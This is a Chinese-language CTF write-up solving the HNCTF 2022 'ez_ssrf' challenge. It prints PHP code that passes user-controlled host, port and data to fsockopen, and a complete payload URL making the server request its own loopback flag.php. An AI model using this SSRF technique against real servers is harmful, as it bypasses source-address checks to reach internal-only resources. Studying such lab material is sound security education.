---
date: 2026-11-11 19:40:00
slug: hnctf2022-week2-ez-ssrf
categories:
  - PHP
  - SSRF
  - 代码审计
---

# [HNCTF 2022 WEEK2] ez_ssrf — fsockopen 自己给自己发一条 HTTP

> **题目类型**：PHP 代码审计 — fsockopen 造成的 SSRF（本机回环绕过来源校验）
>
> **Flag**：`nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}`

---

## 题目概述

提示让进 `index.php`，进去就是源码。**`highlight_file(__FILE__)`，一点遮挡都没有。**

同时扫目录扫到 `flag.php`，**但直接访问它，返回的是 `localhost plz`。**

---

## 解题过程

### Step 1：先看源码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

$data = base64_decode($_GET['data']);
$host = $_GET['host'];
$port = $_GET['port'];

$fp = fsockopen($host, intval($port), $error, $errstr, 30);
if (!$fp) {
    die();
} else {
    fwrite($fp, $data);
    while (!feof($data)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
```

**三个参数全部来自 GET，而且都直接进函数：**

```
host  →  fsockopen 的第一个参数
port  →  第二个参数（有 intval）
data  →  base64 解码后直接写进 socket
```

**`fsockopen` 是“建立一条 TCP 连接”，`fwrite` 是“往这条连接里发原始字节”。**

**这等于给了我们一个可以**手写任意 TCP 报文**的口子。**

### Step 2：为什么改 Host 头没用

**`flag.php` 检查的不是请求头里的 `Host`，而是**连接的来源地址**（`$_SERVER['REMOTE_ADDR']`）。**

**所以你在浏览器或 Burp 里把 `Host: localhost` 改掉，来源地址还是你自己的 IP，一样被拒。**

**这就是这题的题眼：改“名字”没用，得改“谁在连”。**

**要让来源变成 `127.0.0.1`，只有一条路——**让服务器自己去连自己**。**

### Step 3：构造发出去的报文

**`fsockopen('127.0.0.1', 80)` 连上的是这台机器自己的 80 端口，也就是 Web 服务器本身。来源地址自然就是 127.0.0.1。**

**接下来 `fwrite($fp, $data)` 会把 `data` 原样写进这个 socket。**既然对面是 HTTP 服务器，那我们就手写一条 HTTP 请求：**

```http
GET /flag.php HTTP/1.1
Host: localhost
Connection: close

```

**注意三件事：**

```
① 每一行结尾必须是 \r\n（CRLF），不是 \n
② 最后要有一个空行（\r\n\r\n），表示请求头结束
③ Connection: close 让对端在响应完就关闭连接，
   这样后面 fgets 才能读到 EOF，不会一直挂着
```

**编码成 base64：**

```python
import base64

raw = "GET /flag.php HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
print(base64.b64encode(raw.encode()).decode())
```

**得到：**

```text
R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
```

### Step 4：为什么建议用脚本生成 base64

**`\r\n` 这两个字符最容易在“复制粘贴”里丢掉。**

**很多在线 base64 工具、聊天框、编辑器，会把 `\r\n` 悄悄规范成 `\n`，你看起来“一模一样”，但发出去的报文行尾是 LF，**服务端解析请求行的时候就错了**。**

**所以这题的编码一定在脚本里做：**让 `\r\n` 从代码里生成，不让它经过剪贴板。

### Step 5：打完整 payload

```text
index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
```

**服务器做的事：**

```
fsockopen("127.0.0.1", 80)      建立本机连接，来源 = 127.0.0.1
fwrite 我们的 HTTP 报文         请求 /flag.php
while 循环 fgets 读回响应       flag 就在响应体里
echo                           输出到页面
```

**拿到：**

```text
nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}
```

---

## 顺带解释：为什么这题“回应有点慢”

**源码里这句是写错了的：**

```php
while (!feof($data)) {      // $data 是字符串，不是文件句柄
    echo fgets($fp, 128);
}
```

**`feof()` 的参数应该是文件句柄（这里该是 `$fp`）。传字符串进去，它只会返回 `false`（配合 `error_reporting(0)`，连警告都看不到）。**

**于是 `!feof($data)` 恒为真——这个循环实际上是个**死循环**。**

**它能“结束”，靠的是：**

```
对端响应完 → Connection: close 关闭连接
→ fgets($fp) 读到 EOF 返回 false
→ echo false 什么也不输出，但循环还在转
→ 直到 PHP 脚本超时（或连接彻底断掉）才停
```

**flag 在第一轮就已经被 `echo` 出去了，所以你能看到结果；**但请求会一直挂到超时，这就是“慢”的来源。**

**如果按正确写法 `feof($fp)`，读到 EOF 就该退出循环，响应会立刻返回。**

---

| 关键点 | 说明 |
| --- | --- |
| `fsockopen` | 建立 TCP 连接，host/port 全可控 → SSRF |
| 来源校验 | `flag.php` 判的是 `REMOTE_ADDR`，不是 `Host` 头 |
| 绕过思路 | 让服务器连自己（127.0.0.1），来源就变成内网 |
| `data` | base64 解码后原样 `fwrite`，等于手写 TCP 报文 |
| 报文格式 | 行尾 `\r\n`，头部结束后要空行 `\r\n\r\n` |
| `Connection: close` | 让对端响应后关连接，`fgets` 才能读到 EOF |
| `feof($data)` | 源码笔误（应为 `$fp`），导致死循环 → 响应慢 |
| base64 陷阱 | 剪贴板/工具会把 `\r\n` 变 `\n`，必须在脚本里生成 |

---

??? note "完整请求"

    ```text
    GET /index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

    data 解码后：
    GET /flag.php HTTP/1.1\r\n
    Host: localhost\r\n
    Connection: close\r\n
    \r\n
    ```

??? note "这题踩的坑"

    **① 改 `Host` 头**

    `Host: localhost` 改与不改都没用——服务端看的不是这个头，是 TCP 连接的来源地址。

    **② payload 里手写 `127.0.01`**

    少一位点。`127.0.01` 在很多系统里解析不到，或者被当成别的写法，连接直接失败。

    **③ 在线工具转 base64**

    `\r\n` 被吃成 `\n`，报文行尾就错了。**这题的编码必须在脚本里做。**

    **④ 以为响应慢是网络问题**

    是源码里 `feof($data)` 写错导致的死循环，跟网络无关。
